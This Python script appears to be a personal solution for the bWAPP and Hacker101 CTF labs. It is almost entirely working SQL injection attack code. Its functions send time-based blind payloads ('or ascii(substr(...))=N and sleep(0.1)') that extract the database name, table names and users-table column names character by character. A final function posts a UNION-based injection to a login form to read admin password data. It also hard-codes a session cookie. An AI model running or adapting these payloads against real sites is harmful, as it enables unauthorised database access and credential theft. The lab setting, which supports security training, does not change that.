import requests
import time
Header={
    "Host" : "2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com",
    "Cookie" : "quizsession=ea6b7d7af855799bfe91e5002fc14319",
    "Content-Length" : "20",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com/evil-quiz/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
#1' or length(database())>4 and sleep(0.5)#
def get_database_length():
    for i in range(10):
        url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+length%28database%28%29%29%3D{}+and+sleep%280.1%29%23&action=search".format(i)
        start_time=time.time()
        resp=requests.get(url,headers=Header)
        if time.time() - start_time > 1:
            print("length={}".format(i))
            return i

def get_database_name(count):
    l=""
    for j in range(count+1):
        for i in range(33,133):
            url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+ascii%28substr%28database%28%29%2C{}%2C1%29%29%3D{}+and+sleep%280.1%29%23&action=search".format(j,i)
            start_time=time.time()
            resp=requests.get(url,headers=Header)
            if time.time() - start_time > 1:
                print(chr(i))

def get_table_num():
    for i in range(100):
        #1' or (select count(table_name) from information_schema.tables where table_schema=database())={} and sleep(0.1)#
        url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D{}+and+sleep%280.1%29%23&action=search".format(i)
        start_time=time.time()
        resp=requests.get(url,headers=Header)
        if time.time() - start_time > 1:
            print("有{}张表".format(i))
            return i

def get_table_name(k,count):
    l=""
    for i in range(1,count+1):
        for j in range(33,133):
            #1' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit k,1),i,1))=j and sleep(0.1)#
            url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+{}%2C1%29%2C{}%2C1%29%29%3D{}+and+sleep%280.1%29%23&action=search".format(k,i,j)
            start_time=time.time()
            resp=requests.get(url,headers=Header)
            if time.time() - start_time > 1:
                l+=chr(j)
    print(l)
   
def get_each_table_length(count):
    for i in range(count):
        for j in range(100):
            #1' or (select length(table_name) from information_schema.tables where table_schema=database() limit hk,1)=hk and sleep(0.1)#
            url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+%28select+length%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+{}%2C1%29%3D{}+and+sleep%280.1%29%23&action=search".format(i,j)
            start_time=time.time()
            resp=requests.get(url,headers=Header)
            if time.time() - start_time > 1:
                print("第{}个表的长度为{}".format(i,j))
                get_table_name(i,j)

def get_users_column_num():
    for i in range(100):
        #1' or (select count(column_name) from information_schema.columns where table_name="users")={} and sleep(0.1)#
        url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D\"users\"%29%3D{}+and+sleep%280.1%29%23&action=search".format(i)
        start_time=time.time()
        resp=requests.get(url,headers=Header)
        if time.time() - start_time > 1:
            print("有{}个字段".format(i))
            return i
def get_users_column_name(index,count):
    l=""
    for i in range(1,count+1):
        for j in range(33,133):
            #1' or ascii(substr((select column_name from information_schema.columns where table_name="users" limit k,1),i,1))=j and sleep(0.1)#
            url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D\"users\"+limit+{}%2C1%29%2C{}%2C1%29%29%3D{}+and+sleep%280.1%29%23&action=search".format(index,i,j)
            start_time=time.time()
            resp=requests.get(url,headers=Header)
            if time.time() - start_time > 1:
                l+=chr(j)
                break
    print(l)
def get_users_each_column_name(count):
    for i in range(count):
        for j in range(100):
            #1' or (select length(column_name) from information_schema.columns where table_name="users" limit hk,1)=hk and sleep(0.1)#
            url="http://192.168.136.128/bWAPP/sqli_15.php?title=1%27+or+%28select+length%28column_name%29+from+information_schema.columns+where+table_name%3D\"users\"+limit+{}%2C1%29%3D{}+and+sleep%280.1%29%23&action=search".format(i,j)
            start_time=time.time()
            resp=requests.get(url,headers=Header)
            if time.time() - start_time > 1:
                print("第{}个字段的长度为{}".format(i,j))
                get_users_column_name(i,j)
                break

def get_password():
    url="http://2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com/evil-quiz/"
    resp=requests.post(url,data={"username": "admin' or 1=1 union select length(password),2,3,4 from admin where substr(username,1,1)>'a' limit 1,1#"},headers=Header)
    print(resp)
# get_database_name(get_database_length())
# table_num=get_table_num()
# get_each_table_length(table_num)
# cn=get_users_column_num()
# get_users_each_column_name(cn)
get_password()